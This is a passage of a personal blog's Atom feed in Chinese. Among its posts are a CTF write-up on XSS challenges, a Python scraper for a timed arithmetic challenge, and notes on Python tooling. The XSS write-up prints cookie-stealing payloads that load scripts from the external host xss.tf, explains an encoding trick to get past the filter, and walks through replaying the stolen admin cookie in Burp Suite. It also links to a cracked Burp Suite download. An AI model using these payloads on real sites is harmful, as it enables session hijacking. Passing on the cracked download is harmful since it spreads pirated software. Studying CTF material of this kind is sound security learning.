alt><br>发送成功，我们可以点Click me to view 看一下运行情况。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0005.png" alt><br>看来代码被原样执行了，没有做过滤处理。</p><p>这样获取cookies就很简单了，植入一个自己的Payload就可以了。我使用了一个免费的XSS平台。<a href="http://xss.tf" target="_blank" rel="noopener">http://xss.tf</a><br>创建一个项目使用默认模块就可以。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0006.png" alt><br>配置完成后，在使用界面可以看到使用说明，提供了很多使用方式。</p><p><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0007.png" alt><br>我们选择直接插入script标签的方式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCrIpt srC=http://xss.tf/GCu&gt;&lt;/sCRipT&gt;</span><br></pre></td></tr></table></figure><p>这里的不规则大小写是为了防止过滤掉script标签，本题经测试可以无视。将代码输入message消息框并提交。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0008.png" alt><br>成功钓到了admin，展开后可以看到cookies。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0009.png" alt><br>接下来就很简单了使用<strong>Burp Suite</strong>修改cookies就可以了。我给出一个永久破解版的<strong>Burp Suite</strong>但是这个版本不是很新，最高只能使用Java 8不过不用注册机破解，已经开启了scanner功能。打开前需要先把时间设置到2017年以前，开启后在恢复时间即可。链接：<a href="https://pan.baidu.com/s/1TLFXq04xmkL4L-cDtYEo7Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1TLFXq04xmkL4L-cDtYEo7Q</a>   提取码：qun1 </p><p><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0010.png" alt><br>先在Proxy中的option里面添加一个代理地址和端口。然后把你的浏览器代理服务设置成这个地址端口即可。代理服务设置详见<a href="https://kkkiona.github.io/2019/04/06/VPS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BASSR_SS/">https://kkkiona.github.io/2019/04/06/VPS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BASSR_SS/</a></p><p><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0011.png" alt><br>开启intercept后，再点一下admin.php。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0012.png" alt><br>把cookies改成刚才获取到的cookies再点forward。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0013.png" alt><br>flag到手。</p><p><strong>第二题：XSS 1</strong></p><p><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0014.png" alt><br>题目说xss.php比较脆弱，请通过URL给admin发送请求捕获admin的cookies，里面包含了flag。</p><p>先点开xss.php看一下。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0015.png" alt><br>从给出的php代码中可以看出来对提交信息里面的” 、&lt;、&gt; 三个符号进行了过滤。先随便提交点东西试试。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0016.png" alt><br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0017.png" alt><br>从提交情况来看，我们的代码放到了script标签里面并被定义成一个字符串变量。很容易想到用”符号构造闭合语句。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;alert(1);//</span><br></pre></td></tr></table></figure><p>如果这段代码可以成插入，那么script标签将会变成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var  a=&quot;&quot;;alert(1);//&apos;;</span><br></pre></td></tr></table></figure><p>实验<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0018.png" alt><br>果然由于”被屏蔽无法构成闭合，而且被锁死的不只是”还有&lt;、&gt;没有这些字符将很难构造我们需要的代码。</p><p>看来直接写入明文是不可能的了，由此我们想到使用“暗文”来绕过php的检测。我们可以通过转码的方式来绕过检测。</p><p>可以通过使用Unicode编码来绕过php的检测，浏览器会自动解析Unicode编码把他转换为相应的字符。此方法需要明确提交的信息执行顺序是先经过php对提交内容进行原封不动的检测，再交给浏览器解析。</p><p>使用编码工具对上面的语句进行转码。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0019.png" alt><br>把编码后的内容提交一下看看。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0020.png" alt><br>OK，成功执行。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0021.png" alt><br>那么接下来只需要植入Payload。对照你的XSS平台的使用说明，发现没有合适的使用方式，因为我们提交的内容在script标签里面，如果直接把我们的Payload写到script里面也不是不行但是过于庞大。也想到可不可以闭合script标签自己再重新构造标签，这个方法也是行不通的，我认为是因为在你的代码被解析之前，原本的script标签已经存在了所以不能闭合，而是会被解释成错误代码。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0022.png" alt><br>可以看到灰色的script标签并没有被解析。所以我们可以使用createElement()方法来把script写到body里面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;;</span><br><span class="line">var s=document.createElement(&apos;script&apos;);</span><br><span class="line">document.body.appendChild(s);</span><br><span class="line">s.src=&quot;http://xss.tf/Vw6&quot;;</span><br><span class="line">//</span><br></pre></td></tr></table></figure></p><p>写入之后发现<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0023.png" alt><br>OK，执行，并且你的XSS平台也收到了提示。但是这里的信息是你本地的信息，因为提交者是你自己抓的包当然也是你的，我们需要通过URL的方式让admin来执行这个脚本。</p><p>回到题目页面把你<strong>编码后</strong>的代码放到示例URL后面<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0024.png" alt><br>提交后发现<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0025.png" alt><br>代码没了，经分析发现原来是Unicode的&amp;#阻断了传输，因为URL传输是有自己的编码的，那么我们就把代码转换成URL编码就可以了。注意是把Unicode编码好的再转一次转成encodeURIComponent编码。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0026.png" alt><br>提交编码。<br><img src="/2019/04/08/XSS-题目解析-（上篇）/Image0027.png" alt><br>flag在cookies里面。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在开始解题之前先说一下什么是&lt;strong&gt;Proof Of Work&lt;/strong&gt;，一会会用到。&lt;br&gt;&lt;img src=&quot;/2019/04/08/XSS-题目解析-（上篇）/Image0001.png&quot; alt&gt;&lt;br&gt;&lt;strong&gt;Proof Of Work&lt;/strong&gt; 简称&lt;strong&gt;POW&lt;/strong&gt;中文叫做工作量证明，简单来说就是用户需要通过计算机完成一定量的计算工作，才能获得需要的信息。可以用来防御拒绝服务攻击也可以用于电子货币。图片上简单说就是你得用计算机算出来这个验证码。图片的要求上说的很清楚了你的验证码前0-6位必须经过MD5加密后能够匹配示例字符串。那么接下来只需要写个脚本跑一下就可以了，官方提供了POW的工具但是我的环境没有调试成功等我试验成功了在发出来过程，这里先用自己的Python代码。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;from itertools import count&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;import hashlib&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def md5(s):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return hashlib.md5(s.encode()).hexdigest()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;for i in count(100000):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if md5(str(i)).startswith(&amp;apos;49ab02&amp;apos;):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        print(i)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        break&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用 haslib 进行MD5加密运算，创建一个 itertools 迭代器 利用cout() 方法从100000开始依次叠加 并将生成数字编码，直到找到前6位能够匹配示例字符的数字。&lt;/p&gt;
&lt;p&gt;知道了怎么获取这个验证码现在开始解题。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第一题：Baby XSS&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/04/08/XSS-题目解析-（上篇）/Image0002.png&quot; alt&gt;&lt;br&gt;根据题目描述，我们需要以admin的身份访问admin.php才能获取里面的flag。先点开admin.php看一下&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Python 简单的网页抓取和提交表单</title>
    <link href="https://kkkiona.github.io/2019/04/07/Python-%E7%AE%80%E5%8D%95%E7%9A%84%E7%BD%91%E9%A1%B5%E6%8A%93%E5%8F%96%E5%92%8C%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95/"/>
    <id>https://kkkiona.github.io/2019/04/07/Python-简单的网页抓取和提交表单/</id>
    <published>2019-04-07T12:56:59.000Z</published>
    <updated>2019-04-15T06:07:57.961Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>环境说明：<strong>Python 3</strong><br>外部依赖：<strong>requests、bs4、BeautifulSoup</strong><br>先看题目</p><p><img src="/2019/04/07/Python-简单的网页抓取和提交表单/Image0001.png" alt><br>题目很简单，就是限时计算给出的算式并提交。<br><del>方法一、计算器一台。方法很简单只需要在1.5s内计算出结果再提交就行了，大约几千左右的APM就够了。</del><br>方法二、<strong>使用网络爬虫</strong>。<br>爬虫的话自然使用Python是最方便不过的，大体思路就是<strong>抓取公式-&gt;计算-&gt;提交</strong>。<br>既然是做题那么首先第一步肯定是<strong>化简</strong>，做题最讨厌的不是不会做而是把1+1做成∞+∞。我们先多刷新几次页面看一下。<br><a id="more"></a><br><img src="/2019/04/07/Python-简单的网页抓取和提交表单/Image0002.png" alt><br><img src="/2019/04/07/Python-简单的网页抓取和提交表单/Image0003.png" alt><br><img src="/2019/04/07/Python-简单的网页抓取和提交表单/Image0004.png" alt><br>可以很明显看到公式采用的是x1+x2*x3-x4的固定格式。那这就简单多了，不需要判断运算符也不用修改运算顺序，直接省去了一个heap的工作量。再来看一下代码。<br><img src="/2019/04/07/Python-简单的网页抓取和提交表单/Image0005.png" alt><br>可以看到表单使用Get传值，传递对象是自己。<strong>GET使用URL传递参数</strong>，来测试一下URL。<br>提交前：<br><img src="/2019/04/07/Python-简单的网页抓取和提交表单/Image0006.png" alt><br>提交后：<br><img src="/2019/04/07/Python-简单的网页抓取和提交表单/Image0007.png" alt><br><img src="/2019/04/07/Python-简单的网页抓取和提交表单/Image0008.png" alt><br>可以看到answer的值被脚本通过URL捕获并显示相关内容。<br>现在的工作具体为抓取<strong>抓取公式-&gt;计算-&gt;生成URL-&gt;提交</strong><br>先来完成前两步工作：<br><strong>新建一个py文件，引入抓包用的requests和分析HTML结构的bs4.</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br></pre></td></tr></table></figure><p><strong>向指定页面发送GET请求并获取响应</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(&quot;http://example.com/&quot;)</span><br></pre></td></tr></table></figure><p><strong>得到的response响应可以以content（二进制流）、text（文本）等多种格式输出，作为文本的时候还可以指定编码格式。<br>现以text格式输出一下看看结果。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Python-简单的网页抓取和提交表单/Image0009.png" alt><br><strong>毫无疑问我们成功抓到了页面内容。下面需要获取公式。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">soup = BeautifulSoup(response.text, &quot;html.parser&quot;)</span><br><span class="line"></span><br><span class="line">getString = soup.find(id=&quot;exp&quot;).string</span><br><span class="line"></span><br><span class="line">Sum = int(getString.split()[2])</span><br><span class="line">Sum *= int(getString.split()[4])</span><br><span class="line">Sum += int(getString.split()[0])</span><br><span class="line">Sum -= int(getString.split()[6])</span><br></pre></td></tr></table></figure><p><strong>先把获取的文本转成BeautifulSoup对象，通过字符串截取和强制转换变成单个数字并计算。由于已经确定运算符和运算规则这里就容易很多。然后把答案插入到URL并发送GET请求</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(&quot;http://example.com/calculator/?answer=&quot; + &apos;%d&apos; % Sum)</span><br></pre></td></tr></table></figure><p>然后你会发现<br><img src="/2019/04/07/Python-简单的网页抓取和提交表单/Image0010.png" alt><br>提示问题页面还未建立，没有问题何来答案。<br>简述一下HTTP请求的规则：<strong>HTTP请求的三次握手</strong><br>客户端向服务端发送syn=1，seq=client请求的ID;<br>服务端向客户端发送syn=1,seq=服务端请求的ID,ack=客户端请求的ID+1;<br>客户端向服务端发送syn=0,seq=客户端请求的ID+1,ack=服务端请求的ID+1,data\data…<br>所以简单来说就是HTTP向服务器发送请求时会有一个专属ID来让服务器和客户端保持连接，这个ID存在于cookies里面。如果不连同cookies发送给服务器，那么服务器就会认为是两个不同的客户发送的请求从而出现上面的错误。所以我们要做的是<strong>连同cookies一起发送。</strong><br><strong>先从response里面获取cookies并保存。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookies = response.cookies</span><br></pre></td></tr></table></figure><p><strong>修改二次请求</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(&quot;http://example.com/?answer=&quot; + &apos;%d&apos; % Sum, cookies=Cookies)</span><br></pre></td></tr></table></figure><p>再来看一下结果<br><img src="/2019/04/07/Python-简单的网页抓取和提交表单/Image0011.png" alt><br>成功！<br>总结：<strong>这道题比较基础，简单的使用了Python的爬虫功能，主要是学习了HTTP请求的过程，关键在于cookies的传递。</strong></p><p><strong>忘记放出完整代码了，补上！</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">response = requests.get(&quot;http://123.207.149.64:23331/calculator/&quot;)</span><br><span class="line">Cookies = response.cookies</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(response.text, &quot;html.parser&quot;)</span><br><span class="line"></span><br><span class="line">getString = soup.find(id=&quot;exp&quot;).string</span><br><span class="line"></span><br><span class="line">Sum = int(getString.split()[2])</span><br><span class="line">Sum *= int(getString.split()[4])</span><br><span class="line">Sum += int(getString.split()[0])</span><br><span class="line">Sum -= int(getString.split()[6])</span><br><span class="line"></span><br><span class="line">response = requests.get(&quot;http://123.207.149.64:23331/calculator/?answer=&quot; + &apos;%d&apos; % Sum, cookies=Cookies)</span><br><span class="line"></span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p>后面打算写一篇关于POST传递的使用方式和详细的HTTP请求的相关知识</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;环境说明：&lt;strong&gt;Python 3&lt;/strong&gt;&lt;br&gt;外部依赖：&lt;strong&gt;requests、bs4、BeautifulSoup&lt;/strong&gt;&lt;br&gt;先看题目&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/04/07/Python-简单的网页抓取和提交表单/Image0001.png&quot; alt&gt;&lt;br&gt;题目很简单，就是限时计算给出的算式并提交。&lt;br&gt;&lt;del&gt;方法一、计算器一台。方法很简单只需要在1.5s内计算出结果再提交就行了，大约几千左右的APM就够了。&lt;/del&gt;&lt;br&gt;方法二、&lt;strong&gt;使用网络爬虫&lt;/strong&gt;。&lt;br&gt;爬虫的话自然使用Python是最方便不过的，大体思路就是&lt;strong&gt;抓取公式-&amp;gt;计算-&amp;gt;提交&lt;/strong&gt;。&lt;br&gt;既然是做题那么首先第一步肯定是&lt;strong&gt;化简&lt;/strong&gt;，做题最讨厌的不是不会做而是把1+1做成∞+∞。我们先多刷新几次页面看一下。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>关于Python的使用</title>
    <link href="https://kkkiona.github.io/2019/04/07/%E5%85%B3%E4%BA%8EPython%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>https://kkkiona.github.io/2019/04/07/关于Python的使用/</id>
    <published>2019-04-07T12:56:59.000Z</published>
    <updated>2019-04-15T06:08:11.191Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>今天遇到了一道网络爬虫的题目，于是便重新拾起了N年前自己学习的Python 2，下面就说一下Python的相关问题。<br>首先关于Python版本的问题，虽然Python 2 ，Python 3 都在更新，而且据统计显示有70%以上的作者仍在使用Python 2，但是真的非常强烈推荐Python 3。Python 3 不仅仅是对语法做了优化，而且对许多库做了改进、合并。比如Python 2 的urllib和urllib2 在Python 3 中合并为了urllib（其实都不如request）。总之Python 3 是非常值得使用的。<br>下面是一些安装问题，你可以去官网下载Python 3并安装，<a href="https://www.python.org/" target="_blank" rel="noopener">https://www.python.org/</a>  Python 3 的Windows安装包是可以勾选path环境变量的无需手动设置。但相比这样我更推荐使用 anaconda 集成包，里面包含了许多科学包及其依赖，同样是一键安装并且可以自动配置环境变量，<a href="https://www.anaconda.com/" target="_blank" rel="noopener">https://www.anaconda.com/</a>  提供了 Python 2，Python 3 两个版本。<br>关于编辑器，新手可以使用Thonny，十分小巧简洁的Python 编辑器，没有复杂的工程模块，打开软件写就完了，并且自带了Python环境无需提前安装Python即可使用，也可以自己配置解释器。缺点是功能相对较弱。<a href="https://thonny.org/" target="_blank" rel="noopener">https://thonny.org/</a><br><img src="/2019/04/07/关于Python的使用/Image0001.png" alt><br><a id="more"></a><br>比较常见的是pyCharm，操作模式类似于eclipse，功能强大代，码高亮，自动填写做的很好。项目管理很方便，可以跨平台。可以很方便的管理库文件，添加外部依赖等等。提供了免费及收费两个版本。没什么大缺点，就是对外部包引入的搜索方式有时候会让人头大。明明项目里都显示有package了就是import不进来。<a href="https://www.jetbrains.com/pycharm/download/#section=windows" target="_blank" rel="noopener">https://www.jetbrains.com/pycharm/download/#section=windows</a><br><img src="/2019/04/07/关于Python的使用/Image0002.png" alt><br>另外推荐一个交互式笔记本，Jupyter notebook（又称IPython notebook）支持运行超过40种编程语言。安装教程十分简单。跨平台，实时代码编辑。缺点，关键词高亮很差，语法检测很弱，有时候错误语法照样可以运行。<a href="https://jupyter.org/" target="_blank" rel="noopener">https://jupyter.org/</a><br><img src="/2019/04/07/关于Python的使用/Image0003.png" alt><br>对于热衷文本编辑器的人员可以使用sublime，另外C、Java程序员可以使用vs和eclipse。Linux推荐vim。<br>关于同时使用Python 2 和 Python 3，如果确实需要两个环境的话。可以参考这篇文章<a href="https://www.cnblogs.com/zhengyihan1216/p/6011640.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhengyihan1216/p/6011640.html</a><br>简述一下就是安装第一个Python的时候记得把Python.exe改个别名，并且使用pip的时候要对应Python版本，最后分别添加path就可以了。<br>下一篇介绍如何简单的使用 requests package抓取页面和表单提交。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天遇到了一道网络爬虫的题目，于是便重新拾起了N年前自己学习的Python 2，下面就说一下Python的相关问题。&lt;br&gt;首先关于Python版本的问题，虽然Python 2 ，Python 3 都在更新，而且据统计显示有70%以上的作者仍在使用Python 2，但是真的非常强烈推荐Python 3。Python 3 不仅仅是对语法做了优化，而且对许多库做了改进、合并。比如Python 2 的urllib和urllib2 在Python 3 中合并为了urllib（其实都不如request）。总之Python 3 是非常值得使用的。&lt;br&gt;下面是一些安装问题，你可以去官网下载Python 3并安装，&lt;a href=&quot;https://www.python.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.python.org/&lt;/a&gt;  Python 3 的Windows安装包是可以勾选path环境变量的无需手动设置。但相比这样我更推荐使用 anaconda 集成包，里面包含了许多科学包及其依赖，同样是一键安装并且可以自动配置环境变量，&lt;a href=&quot;https://www.anaconda.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anaconda.com/&lt;/a&gt;  提供了 Python 2，Python 3 两个版本。&lt;br&gt;关于编辑器，新手可以使用Thonny，十分小巧简洁的Python 编辑器，没有复杂的工程模块，打开软件写就完了，并且自带了Python环境无需提前安装Python即可使用，也可以自己配置解释器。缺点是功能相对较弱。&lt;a href=&quot;https://thonny.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://thonny.org/&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;/2019/04/07/关于Python的使用/Image0001.png&quot; alt&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>First Article</title>
    <link href="https://kkkiona.github.io/2019/04/03/first%20blog/"/>
    <id>https://kkkiona.github.io/2019/04/03/first blog/</id>
    <published>2019-04-03T12:24:54.992Z</published>
    <updated>2019-04-04T13:05:50.753Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>早上看了一下之前的Github实在是不忍直视<br><img src="https://img-blog.csdnimg.cn/20190403201220137.jpg" alt="在这里插入图片描述"><br>还是重新制作一个吧。<br>使用的是hexo搭建的博客，步骤比较简单。但是在themes选择上真的是强迫症患者的噩梦<img src="https://img-blog.csdnimg.cn/2019040320150486.jpg" alt="在这里插入图片描述">。<br>偏偏就喜欢上了一个已经停止维护的yilia主题，尝试了无数次修改buffer大小之后依然无法使用HTTP下载，还是ssh吧。<br>下载下来之后更是bug一大堆，比如tag。修改了半天总算是基本正常了。</p><p>既然是新做的博客必须好好搞一下，从网易云拉了音乐，另外搞了一下午的图灵机器人，而且失败了。<img src="https://img-blog.csdnimg.cn/2019040320150486.jpg" alt="在这里插入图片描述">。其实hexo 是自带Live2D功能的，但是想做一个高大上的带交友功能的机器人。然而node.js不熟悉挂接图灵接口的时候就是不行，最后无奈先用自带的吧。明天开始研究信息安全。有时间再搞图灵。。<img src="https://img-blog.csdnimg.cn/2019040320224889.gif" alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="随笔" scheme="https://kkkiona.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
